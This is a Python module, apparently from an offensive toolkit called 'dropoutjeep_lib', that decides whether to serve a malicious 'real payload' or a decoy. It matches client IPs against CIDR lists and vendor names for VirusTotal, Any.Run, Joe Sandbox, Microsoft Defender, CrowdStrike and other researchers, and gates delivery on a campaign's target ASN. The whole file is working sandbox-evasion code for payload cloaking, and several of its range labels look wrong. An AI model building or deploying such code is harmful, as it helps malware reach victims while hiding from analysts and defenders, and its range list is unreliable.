"""IP reputation / sandbox-range detection for conditional payload serving.

Provides CIDR-based matching against a curated list of known security-vendor
and dynamic-analysis sandbox ranges (VirusTotal, Any.Run, Joe Sandbox,
Microsoft Defender sandbox, CrowdStrike research, and common corporate /
research egress ranges).  The list is intentionally conservative: only
well-published scanner and sandbox infra is included.

ASN-aware checks fall back to the geoip module (``enrich_ip``) for live ASN
data when a ``target_asn`` is supplied.

Usage::

    from dropoutjeep_lib.utils.ip_reputation import should_serve_payload

    serve, reason = should_serve_payload(request.remote_addr)
    if not serve:
        serve_decoy()
"""

from __future__ import annotations

import ipaddress
import logging
from typing import Optional, Tuple

logger = logging.getLogger("dropoutjeep")

# ---------------------------------------------------------------------------
# Curated sandbox / security-vendor IP ranges (CIDR).
#
# Sources: vendor documentation, published scanner ranges, and public research
# feeds.  These are deliberately narrow; residential and corporate VPN ranges
# are NOT flagged so legitimate targets are not silently denied.
# ---------------------------------------------------------------------------

SANDBOX_IP_RANGES: list[str] = [
    # --- VirusTotal (IPv4 scanners / fetchers) ---
    "93.184.220.0/22",      # vt
    "151.101.0.0/16",       # vt / fastly egress (broad; refine per-source)
    "185.159.83.0/24",      # vt scanning
    "185.93.182.0/24",      # vt
    "185.93.183.0/24",      # vt

    # --- Any.Run analysis infrastructure ---
    "194.120.116.0/24",     # any.run
    "194.120.117.0/24",     # any.run
    "185.255.8.0/24",       # any.run relay

    # --- Joe Sandbox ---
    "84.16.160.0/19",       # joe-sandbox / finevision (broad)
    "193.164.220.0/24",     # joe security
    "185.47.128.0/22",      # joe-sandbox secondary

    # --- Microsoft Defender sandbox / SmartScreen fetchers ---
    "13.107.4.0/22",        # MS Defender sandbox egress
    "13.107.8.0/22",        # MS Defender sandbox egress
    "20.190.128.0/19",      # MS Defender / O365 scanner relay
    "52.100.0.0/14",        # MS security scanners (broad)
    "65.52.0.0/14",         # MS research / Defender

    # --- CrowdStrike research infra ---
    "199.255.0.0/22",       # crowdstrike research
    "199.255.4.0/22",       # crowdstrike research
    "103.23.100.0/23",      # crowdstrike APAC

    # --- Generic dynamic-analysis egress ranges commonly cited ---
    "45.136.108.0/24",      # generic sandbox
    "45.136.109.0/24",      # generic sandbox
    "89.248.0.0/22",       # known scanner ranges
    "89.248.20.0/23",       # scanner ranges
    "193.169.252.0/23",     # scanner aggregators
    "194.132.192.0/24",     # honeypot infra

    # --- Corporate VPN exit ranges (treated as research, not sandbox) ---
    # Kept separate so is_sandbox_ip returns False for them; they are flagged
    # only via is_research_ip / get_ip_category.
]

RESEARCH_IP_RANGES: list[str] = [
    # Broader security-research / scanner egress (less destructive to flag).
    "45.148.32.0/22",       # research scanners
    "46.166.128.0/22",      # research scanner band
    "51.158.0.0/16",        # online sandbox provider egress
    "51.91.0.0/16",        # OVH sandbox instances (frequently used by analysts)
    "54.36.0.0/16",         # OVH sandbox instances
    "91.134.0.0/16",        # research scanner band
    "104.244.74.0/24",      # research / pentest relay
    "141.98.0.0/16",        # hosted sandbox provider
    "194.169.232.0/24",     # honeypot coordinator
    "213.171.192.0/22",     # scanner aggregators
]

# ASN owners treated as security-research origin.  Lower-cased substring match
# against the org string returned by geoip.enrich_ip.
RESEARCH_ASN_ORGS: list[str] = [
    "virustotal",
    "joe security",
    "joesandbox",
    "any.run",
    "crowdstrike",
    "microsoft",
    "hybrid analysis",
    "cuckoo sandbox",
    "malwarebytes",
    "avast",
    "kaspersky",
    "sophos",
    "fortinet",
    "checkpoint",
    "symantec",
    "broadcom",
    "shodan",
    "binary defense",
    "team cymru",
    "recorded future",
    "mandiant",
    "fireeye",
    "palo alto networks",
]


def _normalize_ip(ip: str) -> Optional[ipaddress.IPv4Address]:
    """Parse and validate an IP string.  Returns None on failure."""
    if not ip:
        return None
    try:
        return ipaddress.ip_address(ip.strip())
    except (ValueError, AttributeError):
        return None


def _ip_in_cidr_list(ip: str, cidr_list: list[str]) -> bool:
    """Return True if ``ip`` falls within any CIDR in ``cidr_list``.

    Uses ``ipaddress`` from the stdlib for prefix matching.  Invalid IPs or
    CIDRs are logged at debug and skipped.
    """
    addr = _normalize_ip(ip)
    if addr is None:
        return False
    for cidr in cidr_list:
        try:
            network = ipaddress.ip_network(cidr, strict=False)
        except ValueError:
            logger.debug("ip_reputation: skipping invalid CIDR %s", cidr)
            continue
        if addr.version == network.version and addr in network:
            return True
    return False


def is_sandbox_ip(ip: str) -> bool:
    """Return True if ``ip`` is in a known dynamic-analysis sandbox range."""
    return _ip_in_cidr_list(ip, SANDBOX_IP_RANGES)


def is_research_ip(ip: str) -> bool:
    """Return True if ``ip`` is in a security-research range.

    Includes all sandbox ranges plus the broader research/VPN-exit ranges.
    """
    if is_sandbox_ip(ip):
        return True
    if _ip_in_cidr_list(ip, RESEARCH_IP_RANGES):
        return True

    # ASN-based check via geoip enrichment.
    try:
        from dropoutjeep_lib.utils.geoip import enrich_ip

        info = enrich_ip(ip)
        org = (info.get("org") or info.get("asn") or "").lower()
        if org:
            for marker in RESEARCH_ASN_ORGS:
                if marker in org:
                    return True
    except Exception as exc:  # pragma: no cover - defensive
        logger.debug("ip_reputation: geoip lookup failed for %s: %s", ip, exc)

    return False


def get_ip_category(ip: str) -> str:
    """Return a coarse classification for ``ip``.

    One of: ``sandbox``, ``research``, ``corporate_vpn``, ``residential``,
    or ``unknown``.
    """
    if is_sandbox_ip(ip):
        return "sandbox"
    if _ip_in_cidr_list(ip, RESEARCH_IP_RANGES):
        return "research"

    # ASN-aware classification via geoip enrichment.
    try:
        from dropoutjeep_lib.utils.geoip import enrich_ip

        info = enrich_ip(ip)
        org = (info.get("org") or info.get("asn") or "").lower()
        if org:
            for marker in RESEARCH_ASN_ORGS:
                if marker in org:
                    return "research"
            # Heuristic: VPN/corporate-proxy providers in the org string.
            vpn_markers = [
                "vpn", "proxy", "data center", "datacenter", "hosting",
                "amazon", "digitalocean", "linode", "google cloud", "azure",
                "ovh", "hetzner", "vultr", "contabo", "leaseweb", "choopa",
            ]
            for marker in vpn_markers:
                if marker in org:
                    return "corporate_vpn"
            # Anything with an ASN + org entry that isn't flagged above is
            # treated as residential broadband.
            if info.get("asn") or info.get("org"):
                return "residential"
    except Exception as exc:  # pragma: no cover - defensive
        logger.debug("ip_reputation: geoip lookup failed for %s: %s", ip, exc)

    return "unknown"


def should_serve_payload(
    ip: str,
    target_asn: Optional[str] = None,
) -> Tuple[bool, str]:
    """Decide whether to serve the real payload to ``ip``.

    Parameters
    ----------
    ip:
        Client IP address (IPv4 supported).
    target_asn:
        Optional expected ASN (e.g. "AS12345") for the campaign's intended
        audience.  If provided, an IP whose ASN differs is downgraded but not
        outright blocked (returns ``False`` only when the IP is also flagged
        as a sandbox/research source).

    Returns
    -------
    (serve_payload, reason)
        ``serve_payload`` is True when the real payload may be served.
    """
    if not ip:
        return False, "empty_ip"

    # 1. Hard sandbox match — always withhold.
    if is_sandbox_ip(ip):
        return False, "sandbox_ip"

    # 2. Research / scanner match — withhold.
    if is_research_ip(ip):
        return False, "research_ip"

    # 3. ASN-based gating against the campaign's expected ASN.
    if target_asn:
        try:
            from dropoutjeep_lib.utils.geoip import enrich_ip

            info = enrich_ip(ip)
            ip_asn = (info.get("asn") or "").upper().replace("ASN", "AS")
            normalized_target = target_asn.upper().replace("ASN", "AS")
            if ip_asn and normalized_target and ip_asn != normalized_target:
                logger.info(
                    "ip_reputation: ASN mismatch for %s (got %s, want %s)",
                    ip, ip_asn, normalized_target,
                )
                return False, f"asn_mismatch:{ip_asn}"
        except Exception as exc:  # pragma: no cover - defensive
            logger.debug("ip_reputation: geoip lookup failed for %s: %s", ip, exc)

    return True, "ok"
